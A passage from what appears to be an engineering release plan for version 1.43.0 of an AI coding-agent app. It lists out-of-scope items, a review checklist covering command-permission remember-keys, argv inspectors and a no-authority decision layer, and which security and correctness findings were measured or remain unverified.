| OQ-43.12 | Which branch carries 1.43.0? | (a) Continue on `feat/TCODE-000-1-41-0` (owner 2026-10-02: one branch for 1.41.0 and what follows). (b) A new `feat/TCODE-000-1-43-0` cut from it after 1.42.0 closes. | **(a)** |

This table and the plan's "Owner questions" table are kept identical; the plan's copy is canonical (it also names the rows each question blocks).

## 9. Explicitly NOT in 1.43.0

| Item | Why |
| --- | --- |
| Decision SaaS presets (TypeSafe, OpenRouter-Jev, Vercel-Jev) | (b), unless OQ-43.2 (c) |
| A Nessy Gateway decision preset or probe before the gateway publishes a route | read-don't-invent; the ⛔ follow-up row UB6.18 |
| Upstream's Laya install hint and external docs link | posture, OQ-43.2b (a) |
| A chat-completions emulation of the decision wire | invention (§5.1) |
| Guarded permission mode (DEC-7) | (c) `auto` on all three, unless OQ-43.4 (b) |
| Adaptive thinking (DEC-10) | (c) native on Claude; unmeasured on the gateway |
| Skills half of suggestions (DEC-13) | (c) skills are listed on every runtime |
| Large-result gate (DEC-12), `guardLargeMcpToolOutput` (R14-25) | measurement first; (c) native spill on Claude |
| Messaging bridges, the WhatsApp LID fix (H18); GitHub Copilot OAuth (H19) | (b) new third-party egress (OQ-43.10) |
| Slack relay (R14-19); Craft domain and docs moves (H16) | (a) |
| de/es/hu/ja/pl/zh-Hans locales (H15) | en+ru only |
| Upstream release notes (H39), packaging churn (H40), Opus 4.6 restore (H22) | Craft's, or decided earlier |
| A SDK bump before the Artifactory mirror (R14-27, R14-28) | owner rule 2026-10-01 |
| Upstream's `system.ts` rewrite and `project_context_files` (H11) | (c) our composition plus native instruction loading |
| The apps/webui viewport fix (H12, webui half) | webui is dormant |
| Re-owning 1.42.0 rows (§6.J) | they stay on UA12.* |

## 10. Review focus (draft)

1. **The remember key equals the click.**
   - No key is wider than the approved argv's class.
   - An exact-argv key persists without ` *` and is matched exactly.
   - Pi's suggestion is built from the same key, and destination equality is enforced.
   - The domain grant covers single plain commands to whitelisted hosts only.
2. **The argv inspectors.** Every refused spelling pinned, both arms (real reads stay read-only).
3. **Source activation re-runs the whole pipeline** (SEC-5). The guardian is consulted on the re-run.
4. **The decision layer has zero authority.**
   - Every caller returns today's behaviour on null, off, slow or failing.
   - No state text is written to disk.
   - No provider or key change from a remote client.
   - No `Nestor-Token` off the verified URL.
   - Paths are under `CONFIG_DIR`.
5. **Transparency.** Every automatic action taken on a decision (a status move, a label, a skipped automation, an inferred verdict) shows its source and its probability to the user.
6. **No gating.** The layer's off default is a user setting; there is no env, build or managed switch. Dropped features' toggles are absent, not hidden.
7. **Three runtimes.** Each row states Pi, Claude and Codex reach or a residue. Codex claims from docs alone are hypotheses.
8. **R14-44 diverges from upstream on purpose.** `buildPendingPromptsForMatchers` always sets `event`/`eventPayload` (a target; absent at HEAD), and the controls go through `PromptHandler` and the catch-up sweep into the `onPromptsReady` closure and `executePromptAutomation`.
9. **New StoredConfig keys** (`decisionLayer`, `rtkExcludeCommands`) follow the DA1.72 recipe in one commit.
10. **New RPC module** (`rpc/decisions.ts`): `HANDLED_CHANNELS` plus the three registration tests and `ipc-inventory`.
11. **i18n.** About 95 `settings.ai.decisions.*` keys plus the feature keys, en+ru, each with its reader.
12. **Rebrand.** No `Craft`, `craft-agent`, `CRAFT_` or `thecraftagents` string ships (extend UA6.6's guard if needed).

## 11. Verified and UNVERIFIED

**Measured by the readers on our shipped code:**
- SEC-1 (probe-remember-key.ts, `81e6d93eb`);
- SEC-3 and SEC-6 (probe-explore-verbs.ts, probe-explore-verbs-2.ts);
- SEC-4 (R14-01, a bun driver on `shouldPromptInAskMode` at `37fdc5e87`, rest-0-14 reader);
- the U43-SEC.6 path audit (`git grep` with a positive control);
- the CLI 2.1.274 template strings (COR-1 and §6.J).

**Re-read for this draft at `8faf46cd1`:**
- the H10 date line (`prompts/system.ts` L299);
- the Pi suggestion rule (`pi-agent.ts`, `ruleContent: \`${baseCommand}:*\``);
- `DEFAULT_SEARCH_MODEL = 'gpt-5.3-codex'`;
- `interruptForHandoff` at `claude-agent.ts` L13119.

**Code readings, not yet measured or driven:** SEC-2's durable half, SEC-5, SEC-7, COR-1's transcript, COR-2, COR-3, R14-13, R14-16/17, R14-18, R14-20, R14-23, H5, H8 (codex half), H20, H21, H25, H26.

**UNVERIFIED (prose only):**
- the Laya checkpoint licence and its Russian coverage (README);
- the DeepSeek alias retirement (upstream's note);
- the codex claims marked "hypothesis" or "residue to measure": codex `acceptForSession`, codex sed/gh auto-accept, codex `turn/interrupt` with an MCP call in flight, codex steer during compaction, codex environment context.

**Reader disagreements resolved here:**

| Item | Reader A | Reader B | Resolution |
| --- | --- | --- | --- |
| Remember key | rest-0-14: adapt, M | security-first: take, CRITICAL, with measured widening | **take, CRITICAL** (SEC-1). The measurement wins. The adapt detail (keep D1.401/D1.403/D1.262) is folded in. |
| Argv inspectors | rest-0-14: adapt, CRITICAL candidate | security-first: take, CRITICAL | **take, CRITICAL** (SEC-3). Ours differs structurally, so they port into our `validateBashCommand`. |
| Handoff interrupt | rest-0-14: take, measure first | security-first: take, HIGH | **take, measure first** (COR-1). CRITICAL as wrong user-facing behaviour once the transcript confirms it. |
| `get_or_create_issue` read-only | inputs file | both readers: stale (F1.289) | stale; dropped from the record |
| Config-dir audit | rest-0-14: adapt (EditPopover) | security-first: drop-c | drop-c: the core is ours. Corrected by the critic: upstream never fixed `EditPopover.tsx` (its v0.14.0 hunk is the semantic-rule wording), so the EditPopover strings are an own-Nessy row (UB4.7), not an adapt |
